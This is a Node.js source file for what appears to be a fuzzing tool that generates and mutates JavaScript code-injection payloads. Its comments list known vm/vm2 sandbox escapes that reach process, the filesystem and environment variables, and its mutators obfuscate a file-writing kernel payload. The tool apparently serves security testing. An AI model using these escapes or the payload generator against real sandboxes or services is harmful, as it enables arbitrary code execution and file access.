const esprima = require('esprima');
const escodegen = require('escodegen');
const estraverse = require('estraverse');

const config = require('../config');
const Utils = require('../common/utils');
const myMath = require('../common/math');
const SimpleGenerator = require('./simpleGenerator');

// source: https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/
// ''.sub.constructor('console.log(process.env)')()
// (function(){console.log(process.env)})()
// (function(something){return something.constructor})(''.sub)
// (function(book){return book.constructor})(''.sub)
// (function({book}){return book.constructor})({book:''.sub})

// source: https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/
// this.constructor.constructor('return process')().exit(); 
// this.__proto__.constructor.constructor('return process')().exit();

// source: https://github.com/patriksimek/vm2/issues/32
// global.constructor.constructor('return process')().mainModule.require('fs').readFileSync('')
// arguments.callee.caller.constructor.constructor('return this').constructor.constructor('return process')()

// source: https://gist.github.com/domenic/d15dfd8f06ae5d1109b0
// this.constructor.constructor('return process').require('fs')

// source: https://medium.com/@d0nut/why-building-a-sandbox-in-pure-javascript-is-a-fools-errand-d425b77b2899
// ((function*(){}).constructor('alert(flag)'))().next()

const KERNEL_SOURCE = `require('fs').writeFileSync('${config.JSCodeInjectionFilePath}', '${config.JSCodeInjectionFileContent}')`;
const KERNEL_AST = esprima.parse(KERNEL_SOURCE).body[0];

const EMPTY_FUNCTION_SOURCE_1 = `(function() {})`;
const EMPTY_FUNCTION_SOURCE_2 = `(new Function())`;
const EMPTY_ARROW_FUNCTION_SOURCE = `(() => {})`;
const EMPTY_GENERATOR_SOURCE = `(function*(){})`;

const EMPTY_FUNCTION_AST_1 = esprima.parse(EMPTY_FUNCTION_SOURCE_1).body[0];
const EMPTY_FUNCTION_AST_2 = esprima.parse(EMPTY_FUNCTION_SOURCE_2).body[0];
const EMPTY_ARROW_FUNCTION_AST = esprima.parse(EMPTY_ARROW_FUNCTION_SOURCE).body[0];
const EMPTY_GENERATOR_AST = esprima.parse(EMPTY_GENERATOR_SOURCE).body[0];

const FUNC_PTR_PARAM_SOURCE_1 = `"".sub`;
const FUNC_PTR_PARAM_SOURCE_2 = EMPTY_FUNCTION_SOURCE_1;
const FUNC_PTR_PARAM_SOURCE_3 = `this.constructor.constructor`;
const FUNC_PTR_PARAM_SOURCE_4 = `global.constructor.constructor`;
const FUNC_PTR_PARAM_SOURCE_5 = EMPTY_ARROW_FUNCTION_SOURCE;


const FUNC_PTR_PARAM_AST_1 = esprima.parse(FUNC_PTR_PARAM_SOURCE_1).body[0].expression;
const FUNC_PTR_PARAM_AST_2 = esprima.parse(FUNC_PTR_PARAM_SOURCE_2).body[0].expression;
const FUNC_PTR_PARAM_AST_3 = esprima.parse(FUNC_PTR_PARAM_SOURCE_3).body[0].expression;
const FUNC_PTR_PARAM_AST_4 = esprima.parse(FUNC_PTR_PARAM_SOURCE_4).body[0].expression;
const FUNC_PTR_PARAM_AST_5 = esprima.parse(FUNC_PTR_PARAM_SOURCE_5).body[0].expression;

const GENERATOR_PTR_PARAM_SOURCE = EMPTY_GENERATOR_SOURCE;

const GENERATOR_PTR_PARAM_AST = esprima.parse(GENERATOR_PTR_PARAM_SOURCE).body[0].expression;;

const REQUIRE_TRANSFORM_SOURCE_1 = `process.mainModule.require`;

const REQUIRE_TRANSFORM_AST_1 = esprima.parse(REQUIRE_TRANSFORM_SOURCE_1).body[0].expression;

const ALL_BINARY_EXPRESSIONS = [ /*'instanceof',*/ 'in', '+', '-', '*', '/', '%', '**', '|', '^', '&', '==', '!=', '===', '!==', '<', '>', '<=', '<<', '>>', '>>>'];
const ALL_LOGICAL_EXPRESSIONS = ['&&', '||'];

function cloneNode(node) {
    return JSON.parse(JSON.stringify(node));
}

function stripExpressionStatement(node) {
    return ('ExpressionStatement' === node.type) ? node.expression : node;
}

function isFunctionNode(node) {
    return ['FunctionExpression', 'ArrowFunctionExpression'].includes(node.type);
}

class EvalMutator {
    static _transformProcess(node) {
        console.log('in _transformProcess');
        estraverse.traverse(node, {
            'enter': (node, parent) => {
                if ('process' === node.name) {
                    // console.log(JSON.stringify(escodegen.generate(parent), null, 2));
                    // process.exit(5);
                }
            }
        });
        return node;
    }

    static _transformRequire(node) {
        console.log('in _transformRequire');
        estraverse.traverse(node, {
            'enter': (node, parent) => {
                if ('require' === node.name) {
                    parent.callee = [
                        REQUIRE_TRANSFORM_AST_1
                    ].randomItem();
                }
            }
        });
        return node;
    }

    static _wrapInFunction(node) {
        console.log('in _wrapInFunction');
        // TODO: Add EMPTY_FUNCTION_AST_2
        let func = cloneNode([EMPTY_FUNCTION_AST_1, EMPTY_ARROW_FUNCTION_AST].randomItem());
        node = stripExpressionStatement(node);
        func.expression.body.body.push({
            'type': 'ReturnStatement',
            'argument': cloneNode(node)
        });
        return func;
    }

    static _wrapInGenerator(node) {
        console.log('in _wrapInGenerator');
        let generator = cloneNode(EMPTY_GENERATOR_AST);
        node = stripExpressionStatement(node);
        generator.expression.body.body.push({
            'type': 'ExpressionStatement',
            'expression': {
                'type': 'YieldExpression',
                'argument': cloneNode(node),
                'delegate': false
            }
        });

        return generator;
    }

    static _callFunction(node) {
        console.log('in _callFunction');
        node = stripExpressionStatement(node);
        if (isFunctionNode(node)) {
            return {
                'type': 'ExpressionStatement',
                'expression': {
                    'type': 'CallExpression',
                    'callee': node,
                    'arguments': []
                }
            };
        }
        throw new Error(`(in _callFunction) Unsupported type: ${node.type}`);
    }

    static _callGenerator(node) {
        console.log('in _callGenerator');
        let calledFunction = EvalMutator._callFunction(node);
        calledFunction = stripExpressionStatement(calledFunction);
        let ret = {
            'type': 'CallExpression',
            'callee': {
                'type': 'MemberExpression',
                'computed': false,
                'object': calledFunction,
                'property': {
                    'type': 'Identifier',
                    'name': 'next'
                }
            },
            'arguments': []
        }
        return ret;
    }

    static _addParams(node) {
        console.log('in _addParams');
        let addParamsMutator =
            [ EvalMutator._addPrimitiveParam,
                EvalMutator._addObjectParam,
                EvalMutator._addFuncPtrParam,
                // EvalMutator._addGeneratorPtrParam
            ].randomItem();
        return addParamsMutator(node);
    }

    static __addParam(node, paramName, paramValue) {
        let paramNameNode = {
            'type': 'Identifier',
            'name': paramName
        };
        let paramValueNode =
            ('object' !== typeof paramValue) ? {
                'type': 'Literal',
                'value': paramValue,
                'raw': JSON.stringify(paramValue)
            } : paramValue;

        estraverse.traverse(node, {
            'enter': (node, parent) => {
                if ((isFunctionNode(node) && 'CallExpression' === parent.type)) {
                    node.params.push(paramNameNode);
                    parent.arguments.push(paramValueNode);
                }
            }
        });
    }

    static _addFuncPtrParam(node) {
        console.log('in _addFuncPtrParam');
        let paramName = Utils.randomVariableName(4);
        let paramValue =
            [FUNC_PTR_PARAM_AST_1,
                FUNC_PTR_PARAM_AST_2,
                FUNC_PTR_PARAM_AST_3,
                FUNC_PTR_PARAM_AST_4,
                FUNC_PTR_PARAM_AST_5
            ].randomItem();
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addGeneratorPtrParam(node) {
        console.log('in _addGeneratorPtrParam');
        let paramName = Utils.randomVariableName(4);
        let paramValue = [GENERATOR_PTR_PARAM_AST].randomItem();
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addObjectParam(node) {
        console.log('in _addObjectParam');
        let paramName = Utils.randomVariableName(4);
        let paramValue = SimpleGenerator.generateRandomObject();
        paramValue = `(${JSON.stringify(paramValue)})`;
        paramValue = esprima.parse(paramValue).body[0];
        paramValue = stripExpressionStatement(paramValue);
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addPrimitiveParam(node) {
        console.log('in _addPrimitiveParam');
        let paramName = Utils.randomVariableName(4);
        let paramValue = SimpleGenerator.generateRandomPrimitive();
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addBinaryExpWithParam(funcPtr, paramName, paramValue) {
        console.log('in _addBinaryExpWithParam');
        let funcBody = funcPtr.body.body;
        let returnStatement = funcBody.filter(node => 'ReturnStatement' === node.type)[0];
        let returnStatementOrigArgs = returnStatement.argument;
        returnStatement.argument = {
            'type': 'BinaryExpression',
            'operator': ALL_BINARY_EXPRESSIONS.randomItem(),
            'left': {
                'type': 'Identifier',
                'name': paramName
            },
            'right': returnStatementOrigArgs
        }
    }

    static _addLogicalExpWithParam(funcPtr, paramName, paramValue) {
        console.log('in _addLogicalExpWithParam');
        let funcBody = funcPtr.body.body;
        let returnStatement = funcBody.filter(node => 'ReturnStatement' === node.type)[0];
        let returnStatementOrigArgs = returnStatement.argument;
        returnStatement.argument = {
            'type': 'LogicalExpression',
            'operator': ALL_LOGICAL_EXPRESSIONS.randomItem(),
            'left': {
                'type': 'Identifier',
                'name': paramName
            },
            'right': returnStatementOrigArgs
        }
    }

    static _addCondExprWithParam(funcPtr, paramName, paramValue) {
        console.log('in _addCondExprWithParam');
        let funcBody = funcPtr.body.body;
        let returnStatement = funcBody.filter(node => 'ReturnStatement' === node.type)[0];
        let returnStatementOrigArgs = returnStatement.argument;
        let randomAlternateValue = SimpleGenerator.generateRandomPrimitive();
        returnStatement.argument = {
            'type': 'ConditionalExpression',
            'test': {
                'type': 'Identifier',
                'name': paramName
            },
            'consequent': returnStatementOrigArgs,
            'alternate': {
                'type': 'Literal',
                'value': randomAlternateValue,
                'raw': JSON.stringify(randomAlternateValue)
            }
        }
    }

    static _addOperationOnFuncParam(funcPtr, paramName, paramValue) {
        console.log('in _addOperationOnFuncParam');
        let funcContent = funcPtr.body.body[0];
        let funcContentStr = escodegen.generate(stripExpressionStatement(funcContent));
        if (funcPtr.body.body[0].argument && funcPtr.body.body[0].argument.callee &&
            funcPtr.body.body[0].argument.callee.arguments &&
            'TemplateLiteral' === funcPtr.body.body[0].argument.callee.arguments[0].type) {
            return;
        }
        funcContentStr = funcContentStr.replace(' require', ' process.mainModule.require');
        funcPtr.body.body[0] = {
            'type': 'ReturnStatement',
            'argument': {
                "type": "CallExpression",
                "callee": {
                    'type': 'CallExpression',
                    'callee': {
                        'type': 'MemberExpression',
                        'computed': false,
                        'object': {
                            'type': 'Identifier',
                            'name': paramName
                        },
                        'property': {
                            'type': 'Identifier',
                            'name': 'constructor'
                        }
                    },
                    'arguments': [{
                        'type': 'TemplateLiteral',
                        'quasis': [{
                            'type': 'TemplateElement',
                            'value': {
                                'raw': funcContentStr,
                                'cooked': funcContentStr
                            },
                            'tail': true
                        }],
                        'expressions': []
                    }]
                },
                'arguments': []
            }
        }
    }
    static _addOperationOnParam(node) {
        console.log('in _addOperationOnParam');
        let paramName = null;
        let paramValue = null;
        let paramIdx = null;
        let funcPtr = null;
        estraverse.traverse(node, {
            'enter': (node, parent) => {
                if ((isFunctionNode(node) && 'CallExpression' === parent.type &&
                        node.params.length > 0)) {
                    paramIdx = Math.randomInt(node.params.length - 1);
                    paramName = node.params[paramIdx].name;
                    paramValue = parent.arguments[paramIdx];
                    funcPtr = node;
                    return estraverse.VisitorOption.Break;
                }
            }
        });

        // paramIdx can be 0 and !0 === true
        if ((null === paramIdx) || !paramName || !paramValue) {
            throw Error(`(in _addOperationOnParam) Could not find param name or param value`);
        }
        let addOpOnParamMutator = null;
        switch (paramValue.type) {
            case 'FunctionExpression':
            case 'ArrowFunctionExpression':
                addOpOnParamMutator = EvalMutator._addOperationOnFuncParam;
                break;
            default:
                addOpOnParamMutator = [
                    EvalMutator._addCondExprWithParam,
                    EvalMutator._addLogicalExpWithParam,
                    EvalMutator._addBinaryExpWithParam
                ].randomItem();
        }
        addOpOnParamMutator(funcPtr, paramName, paramValue);
        return node;
    }

    static _addUnaryOp(node) {
        node = stripExpressionStatement(node);
        return {
            'type': 'ExpressionStatement',
            'expression': {
                'type': 'UnaryExpression',
                'operator': ['+', '-', '~', '!', 'delete', 'void', 'typeof'].randomItem(),
                'argument': node,
                'prefix': true
            }
        }
    }

    static getMutator(node) {
        node = stripExpressionStatement(node);
        switch (node.type) {
            case 'CallExpression':
                if (isFunctionNode(node.callee)) { // (function foo() {})()
                    if (0 === node.callee.params.length) {
                        return EvalMutator._addParams;
                    } else {
                        return EvalMutator._addOperationOnParam;
                    }
                }
                // if ('next' === node.callee.property.name) { // calling generator
                //     break;
                // }
            case 'Literal':
            case 'Identifier':
            case 'UnaryExpression':
                return [EvalMutator._transformRequire,
                    EvalMutator._transformProcess,
                    EvalMutator._addUnaryOp,
                    EvalMutator._wrapInFunction,
                    /*EvalMutator._wrapInGenerator*/
                ].randomItem();
            case 'ArrowFunctionExpression': // (() => {})
            case 'FunctionExpression': // (function foo() {})
                return node.generator ? EvalMutator._callGenerator : EvalMutator._callFunction;
            case 'MemberExpression':
                if ('constructor' === node.property.name) {
                    // TODO: handle the case of (function () {}).constructor
                }
                // return EvalMutator._swapDotAndBracets;
            default:
                throw Error(`Unsupported type ${node.type}`);
        }
        return (n) => n;
    }

    static mutate(input) {
        if (!input) {
            return KERNEL_AST;
        }
        let node = ('string' === typeof(input)) ? esprima.parse(input) : input;
        node = ('Program' === node.type) ? node.body[0] : node;
        let mutator = EvalMutator.getMutator(node);
        return mutator(node);
    }
}

// var input = EvalMutator.mutate(); // kernel
// for (let i = 0; i < 10; ++i) {
//     input = EvalMutator.mutate(input);
//     try {
//         let src = escodegen.generate(input);
//         console.log(src);
//         eval(src);
//     } catch (e) {
//         console.log('### ERROR ###');
//         console.log(e);
//         console.log(JSON.stringify(input, null, 2));
//         break;
//     }
// }


module.exports = EvalMutator;